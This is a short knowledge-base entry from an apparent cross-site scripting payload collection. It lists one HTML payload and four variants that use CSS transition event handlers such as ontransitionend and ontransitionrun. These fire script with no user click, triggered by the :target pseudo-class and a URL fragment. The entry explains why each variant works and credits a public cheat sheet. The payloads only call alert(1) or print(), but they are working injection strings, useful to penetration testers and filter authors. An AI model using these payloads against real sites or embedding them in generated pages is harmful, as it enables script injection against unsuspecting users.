---
title: CSS Transition Event Handlers (no interaction)
slug: css-transition-events
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/event-handler, sink/innerHTML]
inbound: []
---

# CSS Transition Event Handlers (no interaction)

## Payload

```html
<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>
```

## Variants

```html
<style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss>
<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=alert(1)></xss>
<style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss>
<style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)></xss>
```

## Context

Fires without user interaction when a CSS transition begins, runs, ends, or is cancelled. The `:target` pseudo-class is activated by the URL fragment (`#x`), causing the browser to apply the transition rule automatically on page load. `ontransitionend` on inline `style="transition:outline 1s"` fires when the element is focused (tabindex triggers browser focus ring outline transition) — may require the URL fragment to match. `onwebkittransitionend` covers older Safari/Chrome. Injected via `innerHTML` or full HTML reflection.

## Provenance

- Distilled from: `../../techniques/dom-xss/event-handler-matrix.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Event Handler Matrix](../../techniques/dom-xss/event-handler-matrix.md)
